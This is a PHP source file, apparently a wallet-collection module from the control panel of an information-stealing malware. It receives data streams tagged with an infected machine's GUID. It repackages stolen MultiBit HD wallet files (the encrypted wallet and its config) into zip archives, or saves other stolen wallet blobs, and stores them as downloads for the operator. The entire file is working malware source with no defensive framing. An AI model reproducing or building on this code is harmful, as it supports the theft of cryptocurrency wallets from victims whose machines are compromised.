<?php
//b2012 ID_CN_NAME_RAND
class Module_wallet extends Module_
{
    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:

            $wStream = new Stream($Data['DATA'], $Data['ORI_DATA_LEN']);
            if($wStream)
            {
                $Type = $wStream->getDWORD();
                if($Type == 33)
                {
                    $WCnt 	= $wStream->getDWORD();
                    $Name 	= $wStream->getSTRING_();
                    $Wallet = $wStream->getBINARY_();
                    $Config = $wStream->getBINARY_();


                    $TMPName = GetTMPDir() . '/' . $Name . "_tmp";
                    $Zip = NewZipFile($TMPName);
                    if($Zip != NULL)
                    {
                        AddFolderToZip($Zip, $Name);
                        AddBufferToZip($Zip, $Name . "/mbhd.yaml", $Config);
                        AddBufferToZip($Zip, $Name . "/mbhd.wallet.aes", $Wallet);
                        SaveZip($Zip);

                        $Zip = NULL;
                        $Name = $Data['GUID'] . "_". $Type ."_". $WCnt ."_" . $Name;

                        $Name = substr($Name, 0, strlen($Name) - 2) . ".zip";
                        $Buffer = file_get_contents($TMPName);

                        $this->insert_downloads($Name, $Buffer);

                        unlink($TMPName);
                    }
                }
                else if($Type == 34)
                {
                    $WCnt = $wStream->getDWORD();
                    $File = $wStream->getBINARY_();
					
                    $Name = $Data['GUID'] . "_". $Type ."_". $WCnt ."_" . MakeRandomString(10) . ".zip";
                    $this->insert_downloads($Name, $File);
                }
                else
                {
                    $WCnt = $wStream->getDWORD();
                    $File = $wStream->getBINARY_();
					
                    $Name = $Data['GUID'] . "_". $Type ."_". $WCnt ."_" . MakeRandomString(10);
                    $this->insert_downloads($Name, $File);
                }
                $wStream = NULL;
            }

            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}